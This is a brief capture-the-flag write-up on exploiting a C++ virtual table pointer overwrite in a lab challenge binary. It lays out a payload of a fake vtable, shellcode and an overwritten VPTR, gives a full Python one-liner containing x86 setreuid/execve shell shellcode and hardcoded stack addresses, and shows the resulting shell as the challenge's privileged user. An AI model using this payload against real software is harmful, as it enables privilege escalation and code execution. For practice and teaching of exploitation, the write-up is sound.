# C++ vtables

## Writeup

If we use padding we can get a segfault. We need overwrite 3 pointers : 
the VPTR pointing to -> the virtual functions table pointer -> the format virtual function of the parent class.
Our payload will look like this:
[virt funcs table POINTER -> &virt func 1][virt func 1][virt func 2][virt func 3: format][      S H E L L C O D E ...    ][   filler ...   ][    VPTR -> &virt funcs table pointer    ]
    ↖ &formatter.str + padding                                                                   

Let's not forget to `unset env COLUMNS` and `unset env LINES` in gdb as usual.

```app-systeme-ch20@challenge02:/tmp/20$ echo 5 > in && echo 2 >> in && python -c 'print "\x69\xfa\xff\xbf" + "\xed\xbe\xad\xde" + "\xf9\xfa\xff\xbf" + "\x75\xfa\xff\xbf" + "\x90\x90\x90\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 22 + "\x65\xfa\xff\xbf"' >> in
app-systeme-ch20@challenge02:/tmp/20$ cat in - | ~/shell
-bash: /challenge/app-systeme/ch20/shell: No such file or directory
app-systeme-ch20@challenge02:/tmp/20$ cat in - | ~/ch20
Padding : 1-5


	Convert in :
	  1: uppercase
	  2: lowercase
String to convert:
whoami
app-systeme-ch20-cracked
```

## Resources

[Checksec.sh - github](https://github.com/slimm609/checksec.sh)
[Smashing C++ VPTRS - Phrack](http://phrack.org/issues/56/8.html)